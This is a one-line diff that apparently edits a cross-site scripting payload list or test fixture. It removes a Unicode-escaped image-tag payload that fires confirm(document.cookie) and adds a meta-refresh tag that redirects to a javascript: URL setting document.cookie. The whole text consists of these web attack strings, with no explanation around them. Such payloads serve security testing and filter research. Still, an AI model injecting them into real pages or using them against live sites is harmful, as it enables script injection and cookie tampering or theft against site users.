@@ -1,1 +1,1 @@
-\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.cookie)\u0022\u003e
+<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
